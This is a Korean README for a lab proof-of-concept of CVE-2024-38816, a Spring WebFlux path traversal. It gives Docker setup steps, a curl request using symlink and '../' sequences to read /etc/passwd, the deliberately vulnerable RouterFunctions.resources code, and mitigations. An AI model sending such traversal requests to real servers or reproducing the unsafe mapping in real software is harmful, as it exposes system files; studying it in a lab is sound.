# CVE-2024-38816 - Spring WebFlux Path Traversal PoC

> Spring WebFlux 정적 자원 라우팅 취약점을 악용한 디렉토리 경로 우회 (Path Traversal) 실습 프로젝트

---

## 📌 개요

이 프로젝트는 [CVE-2024-38816](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-38816) 취약점을 실습하고 검증하기 위한 PoC입니다.

Spring WebFlux 환경에서 `RouterFunctions.resources()` 메서드를 사용할 때, 경로 정규화 없이 사용자 입력을 그대로 파일 시스템에 매핑할 경우 **디렉토리 경로 우회(Path Traversal)**가 발생할 수 있습니다.

---

## ⚙️ 환경 정보

- **Framework**: Spring Boot 3.0.13 (WebFlux)
- **Java**: OpenJDK 17
- **Build Tool**: Gradle 7.6.1
- **Platform**: Docker 기반 멀티스테이지 빌드 사용
- **PoC 기반**: `FileSystemResource`와 `/static/**` 매핑

---

## 🛠️ 실행 방법

### 1. 프로젝트 클론 및 이동

```bash
git clone https://github.com/your-id/cve-2024-38816-poc.git
cd cve-2024-38816-poc
```

### 2. Docker 빌드 및 실행

```bash
docker build -t path-traversal-demo .
docker run --rm -p 8080:8080 path-traversal-demo
```

---

## 🧪 공격 시나리오

실행 중인 애플리케이션에 다음 요청을 보내 `/etc/passwd` 파일을 노출시킬 수 있습니다.

```bash
curl http://localhost:8080/static/link/../link/../etc/passwd
```

### 기대 결과 (Linux 환경일 경우):

```
root:x:0:0:root:/root:/bin/bash
...
```

---

## 📂 프로젝트 구조

```plaintext
.
├── Dockerfile
├── build.gradle
├── LICENSE
├── README.md
└── src/
    └── main/java/com/example/PathTraversalDemoApplication.java
```

---

## 🔐 취약 코드 설명

```java
@Bean
public RouterFunction<ServerResponse> staticRouter() {
    return RouterFunctions.resources("/static/**", new FileSystemResource("/app/static/"));
}
```

- `/static/**` 경로는 `/app/static/` 파일 시스템 루트를 그대로 참조합니다.
- 심볼릭 링크(`/static/link → /static`)와 상대경로(`../`)를 조합하면 디렉토리 탈출 가능

---

## ✅ 대응 방안

- 상대 경로 필터링 (`../` 포함 여부 체크)
- 정규화(normalization)된 경로만 허용
- classpath 내 리소스만 서빙하도록 제한
- 심볼릭 링크 제거 또는 분리된 볼륨 처리
- Spring Security 등을 활용한 경로 보호

---

## 📚 참고자료

- [Spring 공식 문서 - WebFlux Static Resources](https://docs.spring.io/spring-framework/docs/current/reference/html/web-reactive.html#webflux-static-resources)
- [CVE 공식 등록: CVE-2024-38816](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-38816)
- [PoC 원본 GitHub](https://github.com/masa42/CVE-2024-38816-PoC)

---

## 📝 라이선스

본 프로젝트는 MIT 라이선스를 따릅니다.
